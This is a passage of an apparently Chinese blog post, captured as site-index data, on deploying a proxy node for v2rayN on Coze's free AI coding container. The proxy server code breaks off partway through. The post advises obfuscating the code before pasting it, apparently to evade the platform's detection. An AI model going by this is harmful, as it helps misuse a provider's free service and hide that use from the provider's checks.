xxxx.coze.site/sub，sub最好改一个只有自己知道得路径\ne\n粘贴导入v2rayN就可以使用了\n不过这是个国内的容器，不能用来翻墙，可以用来隐藏IP？\n补充：弄到最后才发现，第一次生成代码部署完成，然后在package.json里加axios和ws的时候，其实应该让它立刻再部署，然后再改index.js和index.html和package，这样可以减少一次它的回退。shit\nanyway，关键是跟他这个引擎反复对话，让他自己修复，然后在它基础上再改，就ok了\n","permalink":"https://rendoumi.com/posts/20260109-coze_program/","summary":"\u003cp\u003e前几天佬友说扣子编程出了一个免费版，所以也想薅一把\u003c/p\u003e\n\u003cp\u003e事先声明：扣子编程是国内的，所以无法\u003cstrong\u003e翻墙\u003c/strong\u003e，本质也是一个容器。能做一个代理隐藏IP来访问国内的网站。\u003c/p\u003e\n\u003cp\u003e所以，说老实话，自己很少有这个场景来使用\u003c/p\u003e\n\u003cp\u003e废话不多说，直接开始:\u003c/p\u003e\n\u003cp\u003e扣子编程的网址：https://code.coze.cn\u003c/p\u003e\n\u003cp\u003e本质是火山引擎旗下的东西，也是一个容器，而且吧，比较有意思，跟 claude 和 codex 差不多\u003c/p\u003e\n\u003cp\u003e基本是：讲述式编程方式，一天智能建3个项目，一个项目是1cpu，2G内存\u003c/p\u003e\n\u003cp\u003e打开网站，新建项目，然后点击网页应用，下面的文本输入框就是编程的地方了：\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20260109143051207\" loading=\"lazy\" src=\"/posts/20260109-coze_program/image-20260109143051207.png\"\u003e\u003c/p\u003e\n\u003cp\u003e我们先让它自己生成一个应用，再在生成的基础上进行修改，直接硬来会有无穷的麻烦，它有自己固定的架构\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e建立一个极简的nodejs程序，不依赖任何前端和后端框架，不要用到next框架。前端页面是index.html，里面是Hello world，主程序是index.js，用来显示index.html的内容，绝对不要用到任何js框架。\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/20260109-coze_program/image-20260110084728806.png\"\u003e然后系统就叽里呱啦、哔哔赖赖开始自己搞了，它缺省创立的项目无论你再怎么强调，都是基于next.js的，都会拉出一坨next的屎，所以会神经兮兮的思考来思考去，产生一堆废物，我们可以不用理他\u003c/p\u003e\n\u003cp\u003e然后显示正常\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20260110084959917\" loading=\"lazy\" src=\"/posts/20260109-coze_program/image-20260110084959917.png\"\u003e\u003c/p\u003e\n\u003cp\u003e从上图我们得到几个关键信息：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e端口是5000\u003c/li\u003e\n\u003cli\u003e文件夹可以看到文件，里面有一堆缺省的配置，就算强调，依然有next拉的屎\u003c/li\u003e\n\u003cli\u003e部署按钮，我们部署测试一下\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e按部署按钮，会得到一个域名\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20260110085206303\" loading=\"lazy\" src=\"/posts/20260109-coze_program/image-20260110085206303.png\"\u003e\u003c/p\u003e\n\u003cp\u003e然后部署成功，点击箭头\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20260110085256978\" loading=\"lazy\" src=\"/posts/20260109-coze_program/image-20260110085256978.png\"\u003e\u003c/p\u003e\n\u003cp\u003e打开后，就是我们想要的\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20260110085334086\" loading=\"lazy\" src=\"/posts/20260109-coze_program/image-20260110085334086.png\"\u003e\u003c/p\u003e\n\u003cp\u003e我们记下来这个\u003cstrong\u003e域名\u003c/strong\u003e，大善人啊，免费域名和免费证书\u003c/p\u003e\n\u003cp\u003e然后回到文件夹，来修改三个文件，index.html 和 index.js 和 package.json\u003c/p\u003e\n\u003cp\u003e先来改 package.json, 在dependencies中，加两句，注意这两句的上一句需要加个逗号，axios最后没有逗号\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;ws\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;^8.14.2\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;axios\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;^1.12.2\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e\u003cimg alt=\"image-20260110085727823\" loading=\"lazy\" src=\"/posts/20260109-coze_program/image-20260110085727823.png\"\u003e\u003c/p\u003e\n\u003cp\u003e注意：写到最后，发现这里可以再部署一下再改index.jsp和index.html比较好，就不用经历我下面的回档了！！！！！\u003c/p\u003e\n\u003cp\u003e我下面是没有再部署，直接硬改，点开文件夹图标，选中index.js，先别贴，需要修改混淆的：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003econst \u003cspan class=\"nv\"\u003ehttp\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e require\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;http\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003econst \u003cspan class=\"nv\"\u003ehttps\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e require\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;https\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003econst \u003cspan class=\"nv\"\u003efs\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e require\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;fs\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003econst \u003cspan class=\"nv\"\u003edns\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e require\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;dns\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003econst \u003cspan class=\"nv\"\u003eaxios\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e require\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;axios\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003econst \u003cspan class=\"nv\"\u003enet\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e require\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;net\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003econst \u003cspan class=\"nv\"\u003epath\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e require\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;path\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003econst \u003cspan class=\"nv\"\u003ecrypto\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e require\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;crypto\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003econst \u003cspan class=\"o\"\u003e{\u003c/span\u003e Buffer \u003cspan class=\"o\"\u003e}\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e require\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;buffer\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003econst \u003cspan class=\"o\"\u003e{\u003c/span\u003e WebSocket, createWebSocketStream \u003cspan class=\"o\"\u003e}\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e require\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;ws\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e// 生成 UUID v4\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003efunction\u003c/span\u003e generateUUID\u003cspan class=\"o\"\u003e()\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e crypto.randomUUID\u003cspan class=\"o\"\u003e()\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003econst \u003cspan class=\"nv\"\u003eUUID\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e process.env.UUID \u003cspan class=\"o\"\u003e||\u003c/span\u003e generateUUID\u003cspan class=\"o\"\u003e()\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003econst \u003cspan class=\"nv\"\u003eDOMAIN\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e process.env.DOMAIN \u003cspan class=\"o\"\u003e||\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;xxxxxxxx.coze.site\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e // 填写项目域名\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003econst \u003cspan class=\"nv\"\u003eWSPATH\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e process.env.WSPATH \u003cspan class=\"o\"\u003e||\u003c/span\u003e UUID.slice\u003cspan class=\"o\"\u003e(\u003c/span\u003e0, 8\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e     // 节点路径，默认获取uuid前8位\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003econst \u003cspan class=\"nv\"\u003eSUB_PATH\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e process.env.SUB_PATH \u003cspan class=\"o\"\u003e||\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;sub\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e            // 节点的订阅路径\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003econst \u003cspan class=\"nv\"\u003eNAME\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e process.env.NAME \u003cspan class=\"o\"\u003e||\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e                       // 节点名称\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003econst \u003cspan class=\"nv\"\u003ePORT\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e process.env.PORT \u003cspan class=\"o\"\u003e||\u003c/span\u003e 5000\u003cspan class=\"p\"\u003e;\u003c/span\u003e                     // http和ws服务端口\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003econst \u003cspan class=\"nv\"\u003eTLS_KEY_PATH\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e process.env.TLS_KEY_PATH \u003cspan class=\"o\"\u003e||\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003econst \u003cspan class=\"nv\"\u003eTLS_CERT_PATH\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e process.env.TLS_CERT_PATH \u003cspan class=\"o\"\u003e||\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003elet\u003c/span\u003e \u003cspan class=\"nv\"\u003eISP\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003econst \u003cspan class=\"nv\"\u003eGetISP\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e async \u003cspan class=\"o\"\u003e()\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e\u0026gt; \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  try \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    const \u003cspan class=\"nv\"\u003eres\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e await axios.get\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;https://api.ip.sb/geoip\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    const \u003cspan class=\"nv\"\u003edata\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e res.data\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nv\"\u003eISP\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"sb\"\u003e`\u003c/span\u003e\u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003edata\u003c/span\u003e\u003cspan class=\"p\"\u003e.country_code\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e-\u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003edata\u003c/span\u003e\u003cspan class=\"p\"\u003e.isp\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"sb\"\u003e`\u003c/span\u003e.replace\u003cspan class=\"o\"\u003e(\u003c/span\u003e/ /g, \u003cspan class=\"s1\"\u003e\u0026#39;_\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"o\"\u003e}\u003c/span\u003e catch \u003cspan class=\"o\"\u003e(\u003c/span\u003ee\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nv\"\u003eISP\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;Unknown\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eGetISP\u003cspan class=\"o\"\u003e()\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003efunction\u003c/span\u003e normalizeSecret\u003cspan class=\"o\"\u003e(\u003c/span\u003evalue\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e!value\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e value.includes\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;\\\\n\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e ? value.replace\u003cspan class=\"o\"\u003e(\u003c/span\u003e/\u003cspan class=\"se\"\u003e\\\\\u003c/span\u003en/g, \u003cspan class=\"s1\"\u003e\u0026#39;\\n\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e : value\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003efunction\u003c/span\u003e readOptionalFile\u003cspan class=\"o\"\u003e(\u003c/span\u003efilePath\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e!filePath\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  const \u003cspan class=\"nv\"\u003eresolvedPath\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e path.isAbsolute\u003cspan class=\"o\"\u003e(\u003c/span\u003efilePath\u003cspan class=\"o\"\u003e)\u003c/span\u003e ? filePath : path.join\u003cspan class=\"o\"\u003e(\u003c/span\u003e__dirname, filePath\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  try \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e fs.readFileSync\u003cspan class=\"o\"\u003e(\u003c/span\u003eresolvedPath, \u003cspan class=\"s1\"\u003e\u0026#39;utf8\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"o\"\u003e}\u003c/span\u003e catch \u003cspan class=\"o\"\u003e(\u003c/span\u003eerror\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    console.warn\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"sb\"\u003e`\u003c/span\u003eFailed to \u003cspan class=\"nb\"\u003eread\u003c/span\u003e TLS file \u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003eresolvedPath\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e: \u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003eerror\u003c/span\u003e\u003cspan class=\"p\"\u003e.message\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"sb\"\u003e`\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003efunction\u003c/span\u003e getTLSOptions\u003cspan class=\"o\"\u003e()\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"nb\"\u003elet\u003c/span\u003e \u003cspan class=\"nv\"\u003ekey\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e normalizeSecret\u003cspan class=\"o\"\u003e(\u003c/span\u003eprocess.env.TLS_KEY\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"nb\"\u003elet\u003c/span\u003e \u003cspan class=\"nv\"\u003ecert\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e normalizeSecret\u003cspan class=\"o\"\u003e(\u003c/span\u003eprocess.env.TLS_CERT\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e!key\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nv\"\u003ekey\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e readOptionalFile\u003cspan class=\"o\"\u003e(\u003c/span\u003eTLS_KEY_PATH\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e!cert\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nv\"\u003ecert\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e readOptionalFile\u003cspan class=\"o\"\u003e(\u003c/span\u003eTLS_CERT_PATH\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003ekey \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e cert\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  